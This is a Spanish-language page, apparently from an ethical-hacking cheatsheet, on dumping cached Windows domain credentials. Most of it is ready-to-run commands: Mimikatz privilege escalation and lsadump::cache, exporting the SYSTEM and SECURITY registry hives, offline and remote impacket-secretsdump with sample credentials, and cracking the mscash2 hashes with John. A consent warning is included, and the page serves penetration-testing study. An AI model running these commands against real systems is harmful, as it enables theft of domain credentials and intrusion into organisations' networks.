
# Credenciales cacheadas

Cuando un usuario inicia sesión en un equipo cliente de Windows que forma parte del dominio de Active Directory, el sistema operativo de Windows almacena una copia de las credenciales de inicio de sesión del usuario en caché en el registro del sistema local. Si el equipo pierde la conectividad de red con el controlador de dominio de Active Directory, el usuario aún puede iniciar sesión en el equipo utilizando las credenciales cacheadas.

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Volcado de credenciales cacheadas de dominio</mark>

### Con Mimikatz

{% code title="Windows de empleado" %}

```
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::cache
echo d985061c53bf303cbac8673fb7e33364 > admin.cache
john --format=mscash2 admin.cache
```

{% endcode %}

{% hint style="warning" %}
Esto no sirve porque necesita una extensión que john entienda
{% endhint %}

### Opción 2: Impacket

{% code title="Windows de empleado" %}

```
reg save hklm\system system.save
reg save hklm\security security.save
```

{% endcode %}

* Llevar esos 2 archivos a Kali

{% content-ref url="/pages/nidKxJlqN0jQ1pHco7Rc" %}
[File Transfers](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/file-transfers.md)
{% endcontent-ref %}

{% code title="En Kali Linux" %}

```
impacket-secretsdump -system system.save -security security.save LOCAL
echo HASH > admin.cache
john --format=mscash2 admin.cache
```

{% endcode %}

### Remoto desde Kali:

```
impacket-secretsdump empleado1:Passw0rd2@IPWINDOWS
```
